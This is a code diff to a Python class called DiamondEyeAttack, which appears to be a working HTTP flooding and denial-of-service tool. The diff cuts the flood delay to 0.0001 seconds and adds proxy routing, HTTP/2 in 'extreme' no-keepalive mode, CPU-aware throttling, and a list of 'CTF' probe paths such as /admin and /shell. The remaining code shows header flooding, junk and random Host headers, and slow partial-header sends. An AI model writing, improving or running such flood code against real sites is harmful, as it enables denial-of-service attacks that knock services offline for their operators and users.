@@ -4,6 +4,7 @@ import random
 import time
 from urllib.parse import urlparse
 from typing import List, Dict
+import psutil
 
 from utils import generate_headers, parse_data_size, random_string
 from colorama import Fore, Style
@@ -31,7 +32,13 @@ class DiamondEyeAttack:
         self.path_fuzz = path_fuzz
         self.header_flood = header_flood
         self.method_fuzz = method_fuzz
-        self.args = args
+        self.args = args or argparse.Namespace()  # ✅ Защита от None
+
+        # CTF paths
+        self.ctf_paths = [
+            '/flag', '/admin', '/api', '/secret', '/backup', '/config',
+            '/robots.txt', '/debug', '/test', '/cgi-bin', '/shell'
+        ]
 
         self.parsed_url = urlparse(url)
         self.host = self.parsed_url.netloc
@@ -56,31 +63,27 @@ class DiamondEyeAttack:
         self._monitor_task = None
         self._rps_task = None
 
+        # ✅ Инициализация psutil
+        psutil.cpu_percent(interval=None)
+
     async def start(self):
+        print(f"{Fore.CYAN}🔧 Ramp-up: warming up...{Style.RESET_ALL}")
+        await asyncio.sleep(1.0)
+
         if self.extreme:
-            # Не держим keepalive — каждый запрос новое соединение
-            limits = httpx.Limits(
-                max_connections=1000,
-                max_keepalive_connections=0,
-                keepalive_expiry=1.0
-            )
+            limits = httpx.Limits(max_connections=1000, max_keepalive_connections=0, keepalive_expiry=1.0)
         else:
-            # Обычный режим — немного keepalive
-            limits = httpx.Limits(
-                max_connections=1000,
-                max_keepalive_connections=20,
-                keepalive_expiry=5.0
-            )
+            limits = httpx.Limits(max_connections=1000, max_keepalive_connections=20, keepalive_expiry=5.0)
 
         base_kwargs = {
             "verify": not self.no_ssl_check,
             "timeout": httpx.Timeout(10.0),
             "limits": limits,
         }
-        if self.use_http2 and not self.extreme:
+        if self.use_http2:
             base_kwargs["http2"] = True
         if self.proxy:
-            base_kwargs["proxies"] = self.proxy
+            base_kwargs["proxies"] = {"all://": self.proxy}  # ✅ Исправлено
 
         tasks = [asyncio.create_task(self.worker(base_kwargs)) for _ in range(self.workers)]
         self._monitor_task = asyncio.create_task(self.monitor())
@@ -100,15 +103,26 @@ class DiamondEyeAttack:
                 clients.append(client)
 
             while not self._shutdown_event.is_set():
+                # ✅ Исправлено: cpu_percent(interval=None)
+                if psutil.cpu_percent(interval=None) > 95:
+                    await asyncio.sleep(0.1)
+                    continue
+
                 method = self.get_random_method()
                 url = self.build_random_url()
+
+                # ✅ Исправлено: защита от None
+                use_junk = getattr(self.args, 'junk', False)
+                use_random_host = getattr(self.args, 'random_host', False)
+                header_flood = getattr(self.args, 'header_flood', False)
+
                 headers = generate_headers(
                     self.host,
                     self.useragents,
                     self.referers,
-                    use_junk=self.args.junk,
-                    use_random_host=self.args.random_host,
-                    header_flood=self.args.header_flood
+                    use_junk=use_junk,
+                    use_random_host=use_random_host,
+                    header_flood=header_flood
                 )
 
                 data = None
@@ -136,7 +150,8 @@ class DiamondEyeAttack:
                     self.active_tasks.add(task)
                     task.add_done_callback(lambda t: self.active_tasks.discard(t))
 
-                await asyncio.sleep(0.001 if self.flood else random.uniform(0.01, 0.1))
+                delay = 0.0001 if self.flood else random.uniform(0.01, 0.1)
+                await asyncio.sleep(delay)
 
         finally:
             for client in clients:
@@ -144,6 +159,20 @@ class DiamondEyeAttack:
                     await asyncio.wait_for(client.aclose(), timeout=1.0)
                 except asyncio.TimeoutError:
                     pass
+
+    def build_random_url(self) -> str:
+        # ✅ Один метод — CTF + path-fuzz
+        if self.flood and self.path_fuzz and random.random() < 0.3:
+            path = random.choice(self.ctf_paths)
+        else:
+            path = random.choice(self.paths)
+
+        if self.path_fuzz:
+            depth = random.randint(2, 5)
+            path += "/" + "/".join(random_string(8) for _ in range(depth))
+
+        query = f"?t={random.randint(1000, 9999)}"
+        return self.base_url + path + query
 
     async def send_request(self, client, method, url, headers, data):
         try:
@@ -174,13 +203,18 @@ class DiamondEyeAttack:
             await writer.drain()
             await asyncio.sleep(0.5)
 
+            # ✅ Исправлено: use_junk и header_flood
+            use_junk = getattr(self.args, 'junk', False)
+            use_random_host = getattr(self.args, 'random_host', False)
+            header_flood = getattr(self.args, 'header_flood', False)
+
             headers = generate_headers(
                 self.host,
                 self.useragents,
                 self.referers,
-                use_junk=self.args.junk,
-                use_random_host=self.args.random_host,
-                header_flood=self.args.header_flood
+                use_junk=use_junk,
+                use_random_host=use_random_host,
+                header_flood=header_flood
             )
             for k, v in headers.items():
                 if self._shutdown_event.is_set():
@@ -263,11 +297,3 @@ class DiamondEyeAttack:
         if self.method_fuzz and random.random() < 0.3:
             return random.choice(self.fuzz_methods)
         return random.choice(self.methods)
-
-    def build_random_url(self) -> str:
-        path = random.choice(self.paths)
-        if self.path_fuzz:
-            depth = random.randint(2, 5)
-            path += "/" + "/".join(random_string(8) for _ in range(depth))
-        query = f"?t={random.randint(1000, 9999)}"
-        return self.base_url + path + query
